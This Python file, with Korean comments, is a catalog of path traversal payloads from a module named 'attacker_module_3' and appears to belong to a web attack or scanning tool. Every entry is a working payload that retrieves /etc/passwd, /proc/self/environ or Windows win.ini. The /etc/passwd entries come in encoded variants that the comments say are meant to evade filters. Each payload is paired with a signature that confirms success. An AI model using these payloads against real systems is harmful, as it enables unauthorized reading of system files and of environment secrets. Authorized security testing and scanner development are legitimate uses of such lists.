"""경로 순회 / 파일 다운로드 페이로드 카탈로그.

설계 원칙: 거짓 양성 위험이 거의 없는 시스템 파일 시그니처에만 의존한다.
- Linux: `/etc/passwd` 의 `root:x:0:0` (인코딩 변형 3종)
- Linux 우회: `/etc` 가 차단된 경우 `/proc/self/environ` 의 `PATH=`
- Windows: `win.ini` 의 `[fonts]` / `[extensions]` (traversal + 절대경로)
"""
from __future__ import annotations

from dataclasses import dataclass

from attacker_module_3.common.result import Confidence


@dataclass(frozen=True)
class PathPayload:
    value: str
    category: str
    signatures: tuple[bytes, ...]
    confidence: Confidence


_PASSWD_SIG = (b"root:x:0:0",)
_WIN_INI_SIG = (b"[fonts]", b"[extensions]")


PAYLOADS: tuple[PathPayload, ...] = (
    # ----- Linux: /etc/passwd 회수 (3종 인코딩 변형으로 필터 우회) -----
    PathPayload(
        value="../../../../../../etc/passwd",
        category="nix-passwd",
        signatures=_PASSWD_SIG,
        confidence=Confidence.HIGH,
    ),
    PathPayload(
        value="..%2f..%2f..%2f..%2fetc%2fpasswd",
        category="nix-passwd-urlenc",
        signatures=_PASSWD_SIG,
        confidence=Confidence.HIGH,
    ),
    PathPayload(
        value="/etc/passwd",
        category="nix-passwd-absolute",
        signatures=_PASSWD_SIG,
        confidence=Confidence.HIGH,
    ),

    # ----- Linux 우회: /etc 가 차단됐지만 /proc 은 살아 있는 경우 -----
    PathPayload(
        value="../../../../../proc/self/environ",
        category="nix-proc-environ",
        signatures=(b"PATH=",),
        confidence=Confidence.MEDIUM,
    ),

    # ----- Windows -----
    PathPayload(
        value="..\\..\\..\\..\\..\\..\\windows\\win.ini",
        category="windows-win-ini",
        signatures=_WIN_INI_SIG,
        confidence=Confidence.HIGH,
    ),
    PathPayload(
        value="C:\\Windows\\win.ini",
        category="windows-win-ini-absolute",
        signatures=_WIN_INI_SIG,
        confidence=Confidence.HIGH,
    ),
)
